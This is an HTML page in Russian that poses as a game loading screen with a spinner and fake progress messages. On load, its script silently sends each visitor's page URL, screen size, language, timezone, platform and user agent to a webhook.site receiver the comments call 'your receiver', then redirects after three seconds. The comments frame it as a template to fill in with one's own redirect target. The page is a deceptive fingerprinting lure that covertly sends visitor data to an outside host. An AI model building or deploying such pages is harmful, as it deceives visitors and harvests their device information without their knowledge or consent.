<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка...</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .box{text-align:center}
  .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
  p{opacity:.8;font-size:15px}
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <p id="msg">Загружаем игру...</p>
</div>

<script>
// ==== ТВОЙ ПРИЁМНИК ====
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";

// ==== КУДА РЕДИРЕКТИТЬ ПОСЛЕ ====
// замени на свою страницу/игру/видео
const REDIRECT_TO = "https://example.com";

// ==== ЧЕРЕЗ СКОЛЬКО СЕКУНД РЕДИРЕКТ ====
const DELAY_SEC = 3;

// ---- 1. пинг на webhook: IP, UA, экран, язык, таймзона ----
fetch(HOOK, {
  method: "POST",
  mode: "no-cors",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({
    event: "visit",
    page: location.href,
    ts: new Date().toISOString(),
    screen: screen.width + "x" + screen.height,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    ua: navigator.userAgent
  })
}).catch(function(){});

// ---- 2. лёгкий прогресс, чтобы не выглядело пусто ----
var msg = document.getElementById("msg");
var steps = ["Загружаем игру...", "Подключаемся...", "Почти готово..."];
var i = 0;
var tick = setInterval(function(){
  i++;
  if (i < steps.length) msg.textContent = steps[i];
  else clearInterval(tick);
}, Math.max(700, Math.floor(DELAY_SEC * 1000 / steps.length)));

// ---- 3. редирект ----
setTimeout(function(){ location.href = REDIRECT_TO; }, DELAY_SEC * 1000);
</script>
</body>
</html>
